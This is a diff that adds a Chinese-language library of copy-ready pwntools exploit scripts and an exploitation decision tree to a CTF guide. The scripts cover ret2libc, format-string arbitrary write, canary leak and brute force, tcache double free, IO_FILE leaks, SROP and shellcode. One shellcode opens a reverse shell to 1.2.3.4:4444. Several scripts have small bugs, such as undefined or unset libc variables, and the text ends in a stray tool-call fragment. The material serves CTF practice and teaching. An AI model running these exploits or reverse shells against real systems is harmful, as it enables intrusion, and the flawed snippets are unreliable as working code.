@@ -21,6 +21,8 @@
 - [十三、完整实战模板](#十三完整实战模板)
 - [十四、实战技巧与注意事项](#十四实战技巧与注意事项)
 - [十五、速查表](#十五速查表)
+- [十六、实战功能脚本库](#十六实战功能脚本库)
+- [十七、实战流程决策树](#十七实战流程决策树)
 
 ---
 
@@ -1057,3 +1059,497 @@ log.success("got shell!")              # 成功（绿色）
 log.warning("offset may be wrong")     # 警告
 log.failure("connection lost")         # 失败（红色）
 ```
+
+---
+
+## 十六、实战功能脚本库
+
+> 以下脚本可直接复制使用，覆盖 PWN 题高频实战场景。每个脚本独立运行，配合 [十三章通用模板](#十三完整实战模板) 的连接/上下文配置即可。
+
+### 1. ROP 自动化 leak libc + getshell
+
+`ret2libc` 完整脚本，自动 leak 任意 GOT、算 libc 基址、调 system。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+
+elf  = ELF('./pwn')
+libc = ELF('./libc.so.6')
+
+def start():
+    if args.REMOTE: return remote(args.HOST, args.PORT)
+    if args.GDB:    return gdb.debug('./pwn', 'b *main\ncontinue')
+    return process('./pwn')
+
+io = start()
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret     = rop.find_gadget(['ret'])[0]
+offset  = 72                      # cyclic 测出的偏移
+
+# ---- stage 1: leak puts@got ----
+payload  = b'A' * offset
+payload += p64(pop_rdi) + p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.symbols['main'])
+io.sendlineafter(b'input: ', payload)
+io.recvline()
+leak = u64(io.recv(6).ljust(8, b'\x00'))
+log.success(f"puts @ {hex(leak)}")
+
+# ---- stage 2: 算基址 + getshell ----
+libc.address = leak - libc.symbols['puts']
+system = libc.symbols['system']
+bin_sh = next(libc.search(b'/bin/sh'))
+log.info(f"libc base @ {hex(libc.address)}")
+
+payload2  = b'A' * offset
+payload2 += p64(ret)                       # 16 字节对齐
+payload2 += p64(pop_rdi) + p64(bin_sh)
+payload2 += p64(system)
+io.sendlineafter(b'input: ', payload2)
+io.interactive()
+```
+
+### 2. 格式化字符串任意写 + 任意读
+
+`fmtstr_payload` 自动构造写，手工 `%n` 读取栈/任意地址。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+
+elf = ELF('./pwn')
+io = process('./pwn')
+
+# ---- 1. 测偏移 ----
+io.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.')
+line = io.recvline()
+# 找到 0x4141414141414141 出现的位置 → offset
+offset = 6
+log.info(f"fmtstr offset = {offset}")
+
+# ---- 2. 任意写：把 printf@got 改成 system@plt（或 libc system）----
+target = elf.got['printf']
+value  = libc.symbols['system']            # 需先 leak libc
+payload = fmtstr_payload(offset, {target: value}, write_size='short')
+io.sendline(payload)
+
+# ---- 3. 任意读：用 %s 读 target 处字符串 ----
+# 注意 64 位下地址含 \x00 会截断，把地址放在 payload 末尾
+addr = elf.got['puts']
+payload_read = b'LEAK:%' + str(offset).encode() + b'$s' + b'AAAA' + p64(addr)
+io.sendline(payload_read)
+io.recvuntil(b'LEAK:')
+got_val = u64(io.recv(6).ljust(8, b'\x00'))
+log.success(f"puts@got = {hex(got_val)}")
+
+# ---- 4. 触发 system("/bin/sh") ----
+io.sendline(b'/bin/sh')
+io.interactive()
+```
+
+### 3. Canary 泄露 + 栈溢出
+
+利用 printf 泄露栈上的 canary，再正常栈溢出。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+
+elf  = ELF('./pwn')
+libc = ELF('./libc.so.6')
+io = process('./pwn')
+
+# ---- 1. 泄露 canary：canary 通常在 rbp-8，对 64 位在格式串第 7+8 处 ----
+# 题目若 printf(buf)，发 %p 链找末尾是 \x00 的 8 字节即 canary
+io.sendline(b'%p.' * 20)
+leak = io.recvline()
+log.info(f"leak: {leak}")
+# 假设第 11 个 %p 是 canary
+canary = int(leak.split(b'.')[10], 16)
+log.success(f"canary = {hex(canary)}")
+
+# ---- 2. 带上 canary 的栈溢出 ----
+offset = 0x38                       # buf 到 canary 的距离
+pop_rdi = 0x401233
+ret     = 0x40101a
+
+# 提前 leak libc（略），这里直接用 one_gadget
+one_gadget = libc.address + 0x4f2c5
+
+payload  = b'A' * offset
+payload += p64(canary)
+payload += p64(0)                    # saved rbp
+payload += p64(ret)                  # 对齐
+payload += p64(one_gadget)
+io.sendline(payload)
+io.interactive()
+```
+
+### 4. partial overwrite / 爆破返回地址
+
+无 leak、PIE 未全开时爆破 1~2 字节返回地址。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='warning')
+
+elf = ELF('./pwn')
+
+def try_once(byte_low):
+    io = process('./pwn')
+    io.sendlineafter(b'input: ', b'A' * 72 + bytes([byte_low]))
+    try:
+        io.recv(timeout=0.5)
+        io.sendline(b'cat /flag')
+        flag = io.recvline(timeout=1)
+        if b'flag' in flag or b'ctf' in flag:
+            log.success(f"hit byte = {hex(byte_low)}: {flag}")
+            return True
+    except Exception:
+        pass
+    io.close()
+    return False
+
+# PIE 题 main 末位固定 0，后门函数低字节在末位+offset
+# 爆破 1 字节（最多 256 次）
+for b in range(1, 0x100):
+    if try_once(b):
+        break
+```
+
+### 5. 堆题：tcache 快速消费 / double free 检测
+
+glibc 2.27+ tcache 利用辅助：把 7 个 chunk 都填进 tcache 触发 fastbin/unsorted。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+
+io = process('./pwn')
+libc = ELF('./libc.so.6')
+
+def alloc(size, data=b'AAAA'):
+    io.sendlineafter(b'> ', b'1')
+    io.sendlineafter(b'size: ', str(size).encode())
+    io.sendlineafter(b'data: ', data)
+
+def free(idx):
+    io.sendlineafter(b'> ', b'2')
+    io.sendlineafter(b'idx: ', str(idx).encode())
+
+def show(idx):
+    io.sendlineafter(b'> ', b'3')
+    io.sendlineafter(b'idx: ', str(idx).encode())
+
+# ---- tcache poisoning：double free 一个 chunk 改 fd 指向 __free_hook ----
+for _ in range(7):                  # 先消耗 tcache 对应大小
+    alloc(0x40)
+target = libc.symbols['__free_hook']
+
+alloc(0x40, b'victim')              # idx 7
+free(7)                             # 进 tcache
+free(7)                             # double free (glibc 2.27 tcache 无 key 校验)
+alloc(0x40, p64(target))            # idx 8，写入 fd
+alloc(0x40)                         # idx 9
+alloc(0x40, p64(libc.symbols['system']))   # idx 10 -> __free_hook = system
+
+# 触发：free 一个内容为 "/bin/sh" 的 chunk
+alloc(0x40, b'/bin/sh\x00')         # idx 11
+free(11)
+io.interactive()
+```
+
+### 6. IO_FILE 利用（_IO_2_1_stdout_ 泄漏 libc）
+
+无 puts/printf 输出函数时，改写 stdout 结构体 leak libc。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+
+io = process('./pwn')
+libc = ELF('./libc.so.6')
+
+# 假设已有任意写原语：write(addr, 8_bytes)
+def write(addr, data):
+    io.sendlineafter(b'addr: ', hex(addr).encode())
+    io.sendlineafter(b'data: ', data.hex().encode())
+
+# stdout 偏移：libc.symbols['_IO_2_1_stdout_']
+stdout = libc.symbols['_IO_2_1_stdout_']
+# 伪造 flags = 0xfbad1800，_IO_write_base 低字节改 \x00 触发输出
+flags = 0xfbad1800
+write(stdout, p64(flags))
+# 改 write_base 末字节为 0，让它从头开始输出
+write(stdout + 0x20, p64(0))            # _IO_write_base
+io.recvuntil(b'\x7f')
+libc_base = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
+log.success(f"libc base = {hex(libc_base)}")
+
+# 接下来任意写 __free_hook / __malloc_hook 即可
+```
+
+### 7. shellcode 生成与注入
+
+NX 关闭时直接注入执行。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+
+elf = ELF('./pwn')
+io  = process('./pwn')
+
+# ---- 1. 标准 /bin/sh ----
+sc = asm(shellcraft.sh())
+# shellcraft.sh() == execve('/bin/sh', 0, 0)
+
+# ---- 2. 读 flag 文件 ----
+sc2 = asm(shellcraft.cat('/flag'))
+
+# ---- 3. 反弹 shell（攻击机监听 1.2.3.4:4444）----
+sc3 = asm(shellcraft.connect('1.2.3.4', 4444) + shellcraft.dupsh())
+
+# ---- 4. 自定义 syscall ----
+# read(0, buf, 0x100) 然后跳回 buf
+buf = 0x10000
+sc4  = asm(f"""
+    mov rdi, 0
+    mov rsi, {buf}
+    mov rdx, 0x100
+    mov rax, 0
+    syscall
+    jmp {buf}
+""")
+
+offset = 0x40 + 8                    # buf + saved rbp
+payload = b'A' * offset + p64(buf) + sc4
+io.sendline(payload)
+io.interactive()
+```
+
+### 8. SROP（SigreturnFrame）
+
+用 `SigreturnFrame` 伪造信号 frame 控制所有寄存器。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+
+elf  = ELF('./pwn')
+libc = ELF('./libc.so.6')
+io   = process('./pwn')
+
+# 需要：一个 syscall; ret gadget 和一个 mov rax, 0xf; syscall 用于触发 sigreturn
+syscall_addr = 0x401200
+# 触发 sigreturn 需 rax=0xf
+frame = SigreturnFrame()
+frame.rax = 59                         # execve
+frame.rdi = next(libc.search(b'/bin/sh'))
+frame.rsi = 0
+frame.rdx = 0
+frame.rsp = 0x601000
+frame.rip = syscall_addr
+
+# 栈溢出：先设 rax=0xf 再 syscall 进入 SigreturnFrame
+payload  = b'A' * 72
+payload += p64(0x4011ff)              # mov rax, 0xf ; ret  (找的 gadget)
+payload += p64(syscall_addr)          # syscall -> sigreturn
+payload += bytes(frame)
+io.sendline(payload)
+io.interactive()
+```
+
+### 9. 多 libc 模糊匹配（libc-database 风格）
+
+泄露 puts/printf 等多个函数低位地址，自动匹配 libc 版本。
+
+```python
+#!/usr/bin/env python3
+"""
+根据泄露的多个 libc 函数地址末 3 位反查 libc 版本。
+配合 https://libc.rip 或本地 libc-database 使用。
+"""
+import requests
+
+# 泄露到的函数地址（末 12 位足够）
+leaks = {
+    'puts':   0x7f1234567a30 & 0xfff,
+    'printf': 0x7f12345a5e80 & 0xfff,
+}
+
+# 方式1: 调用 libc.rip API
+r = requests.post('https://libc.rip/api/find', json={
+    'symbols': {k: hex(v) for k, v in leaks.items()}
+})
+for lib in r.json():
+    print(lib['id'], lib['download_url'])
+# 输出第一个匹配，下载对应 libc，pwntools ELF 加载后计算 system / bin_sh 偏移
+```
+
+### 10. 自动化模板爆破器（canary / PIE 单字节爆破）
+
+```python
+#!/usr/bin/env python3
+"""逐字节爆破 canary（fork 型题目，canary 不变）"""
+from pwn import *
+context(arch='amd64', log_level='warning')
+
+io = remote(HOST, PORT)              # fork-server，父子 canary 相同
+
+def try_byte(known, pos):
+    io.sendline(b'A' * 8 + known + bytes([pos]))
+    # 父进程靠子进程是否 crash 判断 canary 字节是否正确
+    resp = io.recv(timeout=1)
+    return b'try again' in resp or b'>' in resp     # 题目对错提示
+
+canary = b'\x00'                      # canary 末字节恒为 \x00
+for i in range(1, 8):
+    for b in range(256):
+        if try_byte(canary, b):
+            canary += bytes([b])
+            print(f"canary[{i}] = {hex(b)}")
+            break
+log.success(f"canary = {hex(u64(canary))}")
+```
+
+### 11. 通用爆破：4 位 PIN / 短验证码
+
+```python
+#!/usr/bin/env python3
+"""4 位数字 PIN 爆破（适用题目设置每次校验、无锁定机制）"""
+from pwn import *
+
+io = remote(HOST, PORT)
+for pin in range(10000):
+    io.recvuntil(b'PIN: ')
+    io.sendline(f"{pin:04d}".encode())
+    resp = io.recvline(timeout=1)
+    if b'correct' in resp or b'success' in resp:
+        log.success(f"PIN = {pin:04d}")
+        io.interactive()
+        break
+log.failure("not found")
+```
+
+### 12. 交互式 Shell 稳定化
+
+拿到 shell 后 `python -c 'import pty;pty.spawn("/bin/bash")'` 升级 PTY。
+
+```python
+#!/usr/bin/env python3
+"""拿到 sh 后升级为完整 TTY 交互 shell"""
+from pwn import *
+io = process('./pwn')
+# ... getshell 后
+io.sendline(b'python3 -c "import pty;pty.spawn(\'/bin/bash\')"')
+io.sendline(b'export TERM=xterm')
+io.sendline(b'stty raw -echo')        # 本端也需配置
+io.interactive()
+```
+
+### 13. patchelf 切换 libc 一键脚本
+
+```python
+#!/usr/bin/env python3
+"""远程题目用题目给的 libc，本地 patchelf 一键替换"""
+import subprocess
+from pwn import *
+
+LIBC = './libc-2.31.so'
+LD   = './ld-2.31.so'
+BIN  = './pwn'
+
+subprocess.run(['patchelf', '--set-interpreter', LD, BIN], check=True)
+subprocess.run(['patchelf', '--replace-needed', 'libc.so.6', LIBC, BIN], check=True)
+log.success("patched, run with: ./pwn")
+
+# 运行时指定，不修改二进制
+# io = process(BIN, env={'LD_PRELOAD': LIBC})
+```
+
+### 14. GDB 脚本辅助：自动断点 + leak 检查
+
+```python
+#!/usr/bin/env python3
+"""gdb.debug 自动断点 + 运行中查看寄存器/内存"""
+from pwn import *
+context(arch='amd64', terminal=['tmux', 'splitw', '-h'])
+
+gdbscript = '''
+b *0x401234
+b *main+0x50
+commands 1
+    x/20gx $rsp
+    info registers rdi rsi rdx
+    continue
+end
+continue
+'''
+io = gdb.debug('./pwn', gdbscript=gdbscript)
+io.interactive()
+```
+
+### 15. 动态获取 libc 版本（`libc.blukat.me` 风格）
+
+```python
+#!/usr/bin/env python3
+"""输入泄露的函数:地址，从 https://libc.rip 在线匹配"""
+import sys, requests
+
+leaks = {
+    'puts':   0x7f1234567a30,
+    'printf': 0x7f12345a5e80,
+}
+# 仅取末 12 位作为指纹
+symbols = {k: hex(v & 0xfff) for k, v in leaks.items()}
+r = requests.post('https://libc.rip/api/find', json={'symbols': symbols})
+candidates = r.json()
+if not candidates:
+    print("no match"); sys.exit(1)
+lib = candidates[0]
+base = leaks['puts'] - int(lib['symbols']['puts'], 16)
+system = base + int(lib['symbols']['system'], 16)
+print(f"libc base = {hex(base)}")
+print(f"system    = {hex(system)}")
+```
+
+---
+
+## 十七、实战流程决策树
+
+拿到一道 PWN 题后按以下顺序判断与决策：
+
+```text
+1. checksec ./pwn
+   ├─ NX 关闭     → 直接 shellcode 注入（见 16.7）
+   ├─ Canary 开   → 需 leak canary（见 16.3）或格式化字符串读
+   ├─ PIE 开      → 必须 leak 一个真实地址算 elf.address（见 16.4）
+   └─ Full RELRO  → 不能改 GOT，转 __free_hook / __malloc_hook / IO_FILE（见 16.6）
+
+2. IDA 看漏洞函数
+   ├─ gets/scanf   → 栈溢出，cyclic 测偏移 → ret2win / ret2libc（见 16.1）
+   ├─ printf(buf)  → 格式化字符串，测偏移 → 任意写任意读（见 16.2）
+   ├─ malloc/free  → 堆题，按 libc 版本选 tcache/fastbin/unsorted（见 16.5）
+   └─ read 精确长度 → 栈溢出，注意 read 无需 \n（用 send 不用 sendline）
+
+3. 无输出函数（puts/printf 都没有）
+   └─ 用 IO_FILE 伪造 stdout 主动 leak（见 16.6）或 SROP（见 16.8）
+
+4. fork 型服务器（父子共享 canary）
+   └─ 逐字节爆破 canary（见 16.10）
+
+5. 远程 libc 未知
+   └─ leak 多个函数末 3 位 → libc.rip 在线匹配（见 16.9 / 16.15）→ patchelf 切换本地测（见 16.13）
+```<tool_call>read<arg_key>filePath</arg_key><arg_value>D:\work\ai_blog\cyber_security\ctf_scripts
